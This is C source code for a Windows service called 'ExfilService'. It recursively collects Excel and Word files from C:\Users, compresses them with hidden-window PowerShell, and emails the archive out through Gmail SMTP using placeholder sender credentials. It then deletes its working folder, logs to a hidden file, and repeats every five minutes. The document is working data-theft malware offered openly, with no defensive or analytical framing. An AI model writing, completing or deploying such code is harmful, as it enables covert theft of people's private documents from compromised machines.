#include <windows.h>
#include <stdio.h>
#include <time.h>

#define SERVICE_NAME "ExfilService"
#define WORKDIR "C:\\Windows\\Temp\\exfil"
#define LOGFILE "C:\\Windows\\Temp\\.syslog" // hidden debug log
#define INTERVAL_MINUTES 5

const char *exts[] = {"xlsx", "docx"};
int ext_count = 2;

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;
BOOL running = TRUE;

// Optional hidden logging
void log_msg(const char *fmt, ...) {
    FILE *f = fopen(LOGFILE, "a");
    if (!f) return;
    va_list args;
    va_start(args, fmt);
    vfprintf(f, fmt, args);
    fprintf(f, "\n");
    va_end(args);
    fclose(f);
}

// Execute a command silently (hidden window)
void run_hidden_cmd(const char *cmd) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (!CreateProcess(NULL, (LPSTR)cmd, NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        log_msg("Failed to run command: %s", cmd);
        return;
    }
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

void search_files(const char *basePath, FILE *listFile) {
    char searchPath[MAX_PATH];
    WIN32_FIND_DATA ffd;
    HANDLE hFind;

    snprintf(searchPath, MAX_PATH, "%s\\*", basePath);
    hFind = FindFirstFile(searchPath, &ffd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (strcmp(ffd.cFileName, ".") == 0 || strcmp(ffd.cFileName, "..") == 0) continue;

        char fullPath[MAX_PATH];
        snprintf(fullPath, MAX_PATH, "%s\\%s", basePath, ffd.cFileName);

        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            search_files(fullPath, listFile);
        } else {
            for (int i = 0; i < ext_count; i++) {
                char *dot = strrchr(ffd.cFileName, '.');
                if (dot && _stricmp(dot + 1, exts[i]) == 0) {
                    fprintf(listFile, "%s\n", fullPath);
                    break;
                }
            }
        }
    } while (FindNextFile(hFind, &ffd) != 0);

    FindClose(hFind);
}

void run_exfil() {
    time_t now = time(NULL);
    char timestamp[64];
    strftime(timestamp, sizeof(timestamp), "%Y%m%d_%H%M%S", localtime(&now));

    CreateDirectory(WORKDIR, NULL);

    char listPath[MAX_PATH];
    snprintf(listPath, MAX_PATH, "%s\\file_list.txt", WORKDIR);
    FILE *listFile = fopen(listPath, "w");
    if (!listFile) return;
    search_files("C:\\Users", listFile);
    fclose(listFile);

    char archivePath[MAX_PATH];
    snprintf(archivePath, MAX_PATH, "%s\\exfil_%s.zip", WORKDIR, timestamp);

    char zipCmd[2048];
    snprintf(zipCmd, sizeof(zipCmd),
        "powershell -NoP -NonI -WindowStyle Hidden -Command \"Get-Content '%s' | ForEach-Object { Compress-Archive -Path $_ -DestinationPath '%s' -Update }\"",
        listPath, archivePath);
    run_hidden_cmd(zipCmd);

    char mailCmd[4096];
    snprintf(mailCmd, sizeof(mailCmd),
        "powershell -NoP -NonI -WindowStyle Hidden -Command \"Send-MailMessage "
        "-From 'YOURMAIL@gmail.com' -To 'YOURMAIL@gmail.com' "
        "-Subject 'Exfil %s' -Body 'Collected files from %s' "
        "-Attachments '%s' "
        "-SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl "
        "-Credential (New-Object PSCredential('YOURMAIL@gmail.com', "
        "(ConvertTo-SecureString 'YOUR_APP_PASSWORD' -AsPlainText -Force)))\"",
        timestamp, getenv("COMPUTERNAME"), archivePath);
    run_hidden_cmd(mailCmd);

    char delCmd[256];
    snprintf(delCmd, sizeof(delCmd), "cmd /c rmdir /s /q \"%s\"", WORKDIR);
    run_hidden_cmd(delCmd);

    log_msg("Exfil completed at %s", timestamp);
}

void WINAPI ServiceCtrlHandler(DWORD ctrlCode) {
    if (ctrlCode == SERVICE_CONTROL_STOP) {
        running = FALSE;
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hStatus, &ServiceStatus);
    }
}

void WINAPI ServiceMain(DWORD argc, LPTSTR *argv) {
    ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    ServiceStatus.dwWin32ExitCode = 0;
    ServiceStatus.dwCheckPoint = 0;

    hStatus = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);
    if (!hStatus) return;

    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &ServiceStatus);

    log_msg("Service started");

    while (running) {
        run_exfil();
        for (int i = 0; i < INTERVAL_MINUTES * 60 && running; i++) {
            Sleep(1000);
        }
    }

    log_msg("Service stopped");
}

int main() {
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        {SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION) ServiceMain},
        {NULL, NULL}
    };
    StartServiceCtrlDispatcher(ServiceTable);
    return 0;
}
